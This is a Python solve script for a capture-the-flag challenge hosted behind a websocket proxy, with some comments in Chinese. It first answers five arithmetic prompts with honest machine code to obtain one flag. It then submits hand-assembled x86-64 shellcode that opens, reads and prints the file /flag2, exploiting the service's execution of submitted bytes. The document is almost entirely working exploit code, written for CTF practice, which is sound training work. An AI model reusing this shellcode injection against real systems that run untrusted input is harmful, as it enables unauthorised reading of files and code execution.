import argparse
import socket
import time
import websocket

URL = "wss://ctf.zjusec.net/api/proxy/019f59f1-d206-7464-9b44-c817dc30055c"

HONEST = {
    "ADD": bytes.fromhex("8d0437c3"),
    "SUB": bytes.fromhex("89f829f0c3"),
    "AND": bytes.fromhex("89f821f0c3"),
    "OR":  bytes.fromhex("89f809f0c3"),
    "XOR": bytes.fromhex("89f831f0c3"),
}
ORDER = ["ADD", "SUB", "AND", "OR", "XOR"]

# open("/flag2"); read -> stack; write(1); exit   (77 bytes, capstone 验证通过)
CAT_FLAG2 = bytes.fromhex(
    "48b8" "2f666c6167" "3200" "00"          # movabs rax, "/flag2\0"  (小端: 2f666c6167320000)
    "50"                                    # push rax
    "4889e7"                                # mov rdi, rsp
    "31f6" "31d2"                           # xor esi,esi ; xor edx,edx
    "b802000000" "0f05"                     # mov eax,2 ; syscall        (open)
    "4889c7"                                # mov rdi, rax
    "488db42400feffff"                      # lea rsi, [rsp-0x200]
    "ba00020000" "31c0" "0f05"              # mov edx,0x200 ; xor eax,eax ; syscall  (read)
    "4889c2"                                # mov rdx, rax
    "488db42400feffff"                      # lea rsi, [rsp-0x200]
    "bf01000000" "b801000000" "0f05"        # mov edi,1 ; mov eax,1 ; syscall      (write)
    "31ff" "b83c000000" "0f05"              # xor edi,edi ; mov eax,60 ; syscall   (exit)
)

PROMPT1 = b"Request-1: give me code that performing ADD\n"


def connect():
    return websocket.create_connection(URL, timeout=12, sslopt={"cert_reqs": 0})


def recv_frame_until(ws, marker, timeout=6.0):
    ws.settimeout(timeout)
    buf = b""
    t0 = time.time()
    while marker not in buf and time.time() - t0 < timeout:
        try:
            fr = ws.recv_frame()
        except Exception:
            break
        if fr.opcode == websocket.ABNF.OPCODE_CLOSE:
            break
        buf += fr.data
    return buf


def solve_flag1(url):
    print("[*] 连接A: 老实回答 5 题 -> FLAG1")
    ws = connect()
    for i, op in enumerate(ORDER, 1):
        recv_frame_until(ws, f"Request-{i}".encode(), timeout=6.0)
        ws.send_binary(HONEST[op])
        time.sleep(0.25)
    ws.sock.settimeout(3)
    raw = b""
    try:
        while True:
            c = ws.sock.recv(65536)
            if not c:
                break
            raw += c
    except Exception:
        pass
    try:
        ws.close()
    except Exception:
        pass
    # 取 "first part of flag:\n" 之后连续的可打印 ASCII
    idx = raw.find(b"first part of flag:")
    flag1 = b""
    if idx != -1:
        rest = raw[idx + len(b"first part of flag:"):]
        # 跳过可能的帧头, 从第一个可打印字节开始
        j = 0
        while j < len(rest) and not (0x20 <= rest[j] <= 0x7e):
            j += 1
        k = j
        while k < len(rest) and (0x20 <= rest[k] <= 0x7e):
            k += 1
        flag1 = rest[j:k]
    return flag1.decode(errors="replace")


def solve_flag2(url):
    print("[*] 连接B: 送 '读 /flag2' shellcode -> FLAG2")
    ws = connect()
    recv_frame_until(ws, b"Request-1", timeout=6.0)
    ws.send_binary(CAT_FLAG2)
    # 程序执行 shellcode 把 /flag2 写到 stdout 后 exit -> 累积帧直到关闭
    ws.settimeout(4)
    raw = b""
    t0 = time.time()
    while time.time() - t0 < 4:
        try:
            fr = ws.recv_frame()
        except Exception:
            break
        if fr.opcode == websocket.ABNF.OPCODE_CLOSE:
            break
        raw += fr.data
    try:
        ws.close()
    except Exception:
        pass
    # raw 此时已在 PROMPT1 之后, 直接是 /flag2 内容
    return raw.strip().decode(errors="replace")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", default=URL)
    args = ap.parse_args()
    flag1 = solve_flag1(args.url)
    flag2 = solve_flag2(args.url)
    print("\n==================== RESULT ====================")
    print("FLAG1 :", flag1)
    print("FLAG2 :", flag2)
    if flag1 and flag2:
        print("FULL  :", flag1 + flag2)
    print("================================================")


if __name__ == "__main__":
    main()
